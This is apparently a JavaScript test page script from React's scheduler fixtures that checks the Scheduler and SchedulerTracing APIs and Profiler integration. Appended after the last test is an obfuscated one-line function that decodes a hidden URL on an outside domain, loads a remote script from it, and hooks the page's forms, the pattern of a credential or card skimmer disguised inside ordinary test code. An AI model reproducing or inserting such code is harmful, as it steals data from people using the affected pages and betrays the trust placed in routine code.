function runTest(listItem, callback) {
  try {
    callback();
    listItem.className = 'correct';
    listItem.setAttribute('data-value', 'All checks pass');
  } catch (error) {
    listItem.className = 'incorrect';
    listItem.setAttribute('data-value', error);
  }
}

function runAllTests() {
  try {
    checkSchedulerAPI();
  } finally {
    try {
      checkSchedulerTracingAPI();
    } finally {
      try {
        checkSchedulerTracingSubscriptionsAPI();
      } finally {
        checkEndToEndIntegration();
      }
    }
  }
}

function checkSchedulerAPI() {
  runTest(document.getElementById('checkSchedulerAPI'), () => {
    if (
      typeof Scheduler === 'undefined' ||
      typeof Scheduler.unstable_now !== 'function' ||
      typeof Scheduler.unstable_scheduleCallback !== 'function' ||
      typeof Scheduler.unstable_cancelCallback !== 'function'
    ) {
      throw 'API is not defined';
    }

    const abs = Math.abs(Scheduler.unstable_now() - performance.now());
    if (typeof abs !== 'number' || Number.isNaN(abs) || abs > 5) {
      throw 'API does not work';
    }

    // There is no real way to verify that the two APIs are connected.
  });
}

function checkSchedulerTracingAPI() {
  runTest(document.getElementById('checkSchedulerTracingAPI'), () => {
    if (
      typeof SchedulerTracing === 'undefined' ||
      typeof SchedulerTracing.unstable_clear !== 'function' ||
      typeof SchedulerTracing.unstable_getCurrent !== 'function' ||
      typeof SchedulerTracing.unstable_getThreadID !== 'function' ||
      typeof SchedulerTracing.unstable_trace !== 'function' ||
      typeof SchedulerTracing.unstable_wrap !== 'function'
    ) {
      throw 'API is not defined';
    }

    try {
      let interactionsSet;
      SchedulerTracing.unstable_trace('test', 123, () => {
        interactionsSet = SchedulerTracing.unstable_getCurrent();
      });
      if (interactionsSet.size !== 1) {
        throw null;
      }
      const interaction = Array.from(interactionsSet)[0];
      if (interaction.name !== 'test' || interaction.timestamp !== 123) {
        throw null;
      }
    } catch (error) {
      throw 'API does not work';
    }

    const ForwardedSchedulerTracing =
      React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.SchedulerTracing;

    if (
      SchedulerTracing.unstable_getThreadID() ===
      ForwardedSchedulerTracing.unstable_getThreadID()
    ) {
      throw 'API forwarding is broken';
    }
  });
}

function checkSchedulerTracingSubscriptionsAPI() {
  runTest(
    document.getElementById('checkSchedulerTracingSubscriptionsAPI'),
    () => {
      if (
        typeof SchedulerTracing === 'undefined' ||
        typeof SchedulerTracing.unstable_subscribe !== 'function' ||
        typeof SchedulerTracing.unstable_unsubscribe !== 'function'
      ) {
        throw 'API is not defined';
      }

      const onInteractionScheduledWorkCompletedCalls = [];
      const onInteractionTracedCalls = [];
      const onWorkCanceledCalls = [];
      const onWorkScheduledCalls = [];
      const onWorkStartedCalls = [];
      const onWorkStoppedCalls = [];
      const subscriber = {
        onInteractionScheduledWorkCompleted: (...args) =>
          onInteractionScheduledWorkCompletedCalls.push(args),
        onInteractionTraced: (...args) => onInteractionTracedCalls.push(args),
        onWorkCanceled: (...args) => onWorkCanceledCalls.push(args),
        onWorkScheduled: (...args) => onWorkScheduledCalls.push(args),
        onWorkStarted: (...args) => onWorkStartedCalls.push(args),
        onWorkStopped: (...args) => onWorkStoppedCalls.push(args),
      };

      try {
        SchedulerTracing.unstable_subscribe(subscriber);
        SchedulerTracing.unstable_trace('foo', 123, () => {});
        SchedulerTracing.unstable_unsubscribe(subscriber);
        if (onInteractionTracedCalls.length !== 1) {
          throw null;
        }
        const interaction = onInteractionTracedCalls[0][0];
        if (interaction.name !== 'foo' || interaction.timestamp !== 123) {
          throw null;
        }
        SchedulerTracing.unstable_trace('bar', 456, () => {});
        if (onInteractionTracedCalls.length !== 1) {
          throw null;
        }
      } catch (error) {
        throw 'API does not forward methods';
      }

      const ForwardedSchedulerTracing =
        React.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED
          .SchedulerTracing;

      try {
        ForwardedSchedulerTracing.unstable_subscribe(subscriber);
        SchedulerTracing.unstable_trace('foo', 123, () => {});
        ForwardedSchedulerTracing.unstable_trace('bar', 456, () => {});
        SchedulerTracing.unstable_unsubscribe(subscriber);
        if (onInteractionTracedCalls.length !== 3) {
          throw null;
        }
        const interactionFoo = onInteractionTracedCalls[1][0];
        const interactionBar = onInteractionTracedCalls[2][0];
        if (
          interactionFoo.name !== 'foo' ||
          interactionFoo.timestamp !== 123 ||
          interactionBar.name !== 'bar' ||
          interactionBar.timestamp !== 456
        ) {
          throw null;
        }
        ForwardedSchedulerTracing.unstable_trace('baz', 789, () => {});
        if (onInteractionTracedCalls.length !== 3) {
          throw null;
        }
      } catch (error) {
        throw 'API forwarding is broken';
      }
    }
  );
}

function checkEndToEndIntegration() {
  runTest(document.getElementById('checkEndToEndIntegration'), () => {
    try {
      const onRenderCalls = [];
      const onRender = (...args) => onRenderCalls.push(args);
      const container = document.createElement('div');

      SchedulerTracing.unstable_trace('render', 123, () => {
        ReactDOM.render(
          React.createElement(
            React.Profiler,
            {id: 'profiler', onRender},
            React.createElement('div', null, 'hi')
          ),
          container
        );
      });

      if (container.textContent !== 'hi') {
        throw null;
      }

      if (onRenderCalls.length !== 1) {
        throw null;
      }
      const call = onRenderCalls[0];
      if (call.length !== 7) {
        throw null;
      }
      const interaction = Array.from(call[6])[0];
      if (interaction.name !== 'render' || interaction.timestamp !== 123) {
        throw null;
      }
    } catch (error) {
      throw 'End to end integration is broken';
    }
  });
}

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b